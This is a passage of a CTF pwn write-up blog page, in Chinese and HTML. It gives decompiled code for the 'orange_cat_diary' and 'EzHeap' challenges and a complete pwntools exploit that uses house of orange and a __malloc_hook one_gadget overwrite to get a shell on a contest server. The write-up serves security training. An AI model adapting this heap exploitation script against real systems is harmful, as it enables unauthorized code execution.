  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The diary content exceeds the maximum length allowed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Memory allocation failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  dword_202058 <span class="token operator">=</span> choice<span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter the diary content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> dword_202058<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Diary addition successful."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用堆溢出打house of orange拿到unsortedbin得到libc基地址，之后用那一次uaf的机会任意地址分配，错位字节绕过size检查 打malloc_hook为 one gadget就好了</p>
<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 1
IP = "8.147.128.251"
PORT = 43423

elf = context.binary = ELF('./orange_cat_diary')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
p.sendafter = lambda x, y: p.sendafter(x, y)
p.sendlineafter = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'\xf7')[-4:])

p = connect()

def add(size,content):
    p.sendlineafter("Please input your choice","1")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)

def show():
    p.sendlineafter("Please input your choice","2")

def delete():
    p.sendlineafter("Please input your choice","3")

def edit(size,content):
    p.sendlineafter("Please input your choice","4")
    p.sendlineafter("Please input the length of the diary content:",str(size))
    p.sendafter("Please enter the diary content:",content)


ru("Hello, I'm delighted to meet you. Please tell me your name.")
payload = b'\x00' * 0x1f
s(payload)


add(0x38,b"AAAA\n")
edit(0x40,b"A" * 0x38 + p64(0xfc1))

add(0x1000,b'A') # hosue of orange
add(0x408,b'A')

show()


r(6)
libc_base = u64(r(6).ljust(8,b'\x00')) - (0x73d0365c5141 - 0x73d036200000)
success(hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


add(0x68,b"BBBB\n")
delete()

edit(0x68,p64(malloc_hook - 0x23))
add(0x68,b"BBBB\n")
one_gadget = libc_base + 0xf03a4
add(0x68,b"a" * 0x13 + p64(one_gadget))



p.sendlineafter("Please input your choice","1")
# g(p)
p.sendlineafter("Please input the length of the diary content:",str(0x8))



p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p>题目的逻辑是这样的</p>
<pre class="line-numbers language-none"><code class="language-none">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
&#123;
  int v3; &#x2F;&#x2F; [rsp+Ch] [rbp-34h] BYREF
  __int64 v4[6]; &#x2F;&#x2F; [rsp+10h] [rbp-30h]

  v4[5] &#x3D; __readfsqword(0x28u);
  init();
  seccomp_init_0();
  v4[0] &#x3D; (__int64)malloc_heap;
  v4[1] &#x3D; (__int64)free_heap;
  v4[2] &#x3D; (__int64)edit_heap;
  v4[3] &#x3D; (__int64)show_heap;
  v4[4] &#x3D; (__int64)exit_programe;
  while ( 1 )
  &#123;
    menu();
    __isoc99_scanf(&quot;%d&quot;, &amp;v3);
    if ( v3 &lt;&#x3D; 0 || v3 &gt; 5 )
      puts(&quot;Invalid choice&quot;);
    else
      ((void (*)(void))v4[v3 - 1])();
  &#125;
&#125;

unsigned __int64 malloc_heap()
&#123;
  unsigned int size; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF
  int i; &#x2F;&#x2F; [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]

  v3 &#x3D; __readfsqword(0x28u);
  for ( i &#x3D; 0; i &lt;&#x3D; 79 &amp;&amp; *((_QWORD *)&amp;chunk_list + i); ++i )
    ;
  if ( i &lt;&#x3D; 79 )
  &#123;
    printf(&quot;size:&quot;);
    __isoc99_scanf(&quot;%d&quot;, &amp;size);
    if ( size &gt;&#x3D; 0x501 )
    &#123;
      puts(&quot;error&quot;);
      exit(0);
    &#125;
    *((_QWORD *)&amp;chunk_list + i) &#x3D; malloc((int)size);
    memset(*((void **)&amp;chunk_list + i), 0, (int)size);
    size_list[i] &#x3D; (int)size;
    printf(&quot;content:&quot;);
    read(0, *((void **)&amp;chunk_list + i), (int)size);
  &#125;
  else
  &#123;
    puts(&quot;full heap! &quot;);
  &#125;
  return v3 - __readfsqword(0x28u);
&#125;

unsigned __int64 free_heap()
&#123;
  unsigned int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h]

  v2 &#x3D; __readfsqword(0x28u);
  puts(&quot;idx:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
  if ( v1 &gt; 0x4F || !*((_QWORD *)&amp;chunk_list + (int)v1) )
  &#123;
    puts(&quot;error!&quot;);
    exit(0);
  &#125;
  free(*((void **)&amp;chunk_list + (int)v1));
  *((_QWORD *)&amp;chunk_list + (int)v1) &#x3D; 0LL;
  return v2 - __readfsqword(0x28u);
&#125;

unsigned __int64 edit_heap()
&#123;
  unsigned int idx; &#x2F;&#x2F; [rsp+0h] [rbp-10h] BYREF
  unsigned int size; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]

  v3 &#x3D; __readfsqword(0x28u);
  printf(&quot;idx:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;idx);
  if ( idx &gt; 0x4F || !*((_QWORD *)&amp;chunk_list + (int)idx) )
  &#123;
    puts(&quot;error!&quot;);
    exit(0);
  &#125;
  printf(&quot;size:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;size);
  if ( size &gt;&#x3D; 0x501 )
  &#123;
    puts(&quot;error&quot;);
    exit(0);
  &#125;
  printf(&quot;content:&quot;);
  read(0, *((void **)&amp;chunk_list + (int)idx), (int)size);
  return v3 - __readfsqword(0x28u);
&#125;

unsigned __int64 show_heap()
&#123;
  unsigned int v1; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-8h]

  v2 &#x3D; __readfsqword(0x28u);
  printf(&quot;idx:&quot;);
  __isoc99_scanf(&quot;%d&quot;, &amp;v1);
  if ( v1 &gt; 0x4F || !*((_QWORD *)&amp;chunk_list + (int)v1) )
  &#123;
    puts(&quot;error!&quot;);
    exit(1);
  &#125;
  printf(&quot;content:&quot;);
  printf(&quot;%s&quot;, *((const char **)&amp;chunk_list + (int)v1));
  return v2 - __readfsqword(0x28u);
&#125;

void __noreturn exit_programe()
&#123;
  exit(0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2024/05/22/ciscn-pwn/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/2/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/4/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/ctf/">ctf<span>57</span></a></li>
		
			<li><a href="/categories/gdb/">gdb<span>1</span></a></li>
		
			<li><a href="/categories/misc/">misc<span>1</span></a></li>
		
			<li><a href="/categories/ysyx/">ysyx<span>3</span></a></li>
		
			<li><a href="/categories/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/iot/">iot<span>1</span></a></li>
		
			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
		
			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
		
			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
		
			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
		
			<li><a href="/tags/tls/">tls<span>1</span></a></li>
		
			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
		
			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
		
			<li><a href="/tags/ysyx/">ysyx<span>3</span></a></li>
		
			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
		
			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
		
			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
		
			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
		
			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
		
			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
		
			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
		
			<li><a href="/tags/rust/">rust<span>1</span></a></li>
		
			<li><a href="/tags/misc/">misc<span>1</span></a></li>
		
			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
		
			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>26</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2025/10/05/图灵完备1/" ><i class="fa fa-file-o"></i>图灵完备1</a>
      </li>
    
      <li>
        <a href="/2025/10/04/ysyx-f4计算机系统的状态机模型/" ><i class="fa fa-file-o"></i>ysyx_f4计算机系统的状态机模型</a>
      </li>
    
      <li>
        <a href="/2025/10/03/ysyx-f3数电基础/" ><i class="fa fa-file-o"></i>ysyx_f3数电基础</a>
      </li>
    
      <li>
        <a href="/2025/09/15/rust1/" ><i class="fa fa-file-o"></i>rust语法基础1</a>
      </li>
    
      <li>
        <a href="/2025/08/25/nssctf4th_pwn/" ><i class="fa fa-file-o"></i>nssctf4th_pwn</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://blog.yuro.work/" title="" target="_blank"]);">yuro</a></li>
	
		<li><i class="false"></i><a href="https://shinichicun.top/" title="" target="_blank"]);">shin</a></li>
	
		<li><i class="false"></i><a href="https://k0rian.github.io/" title="" target="_blank"]);">k0rain</a></li>
	
		<li><i class="false"></i><a href="https://tokameine.top/" title="" target="_blank"]);">TokameinE</a></li>
	
		<li><i class="false"></i><a href="https://blog.xinshi.fun/" title="" target="_blank"]);">LilRan</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
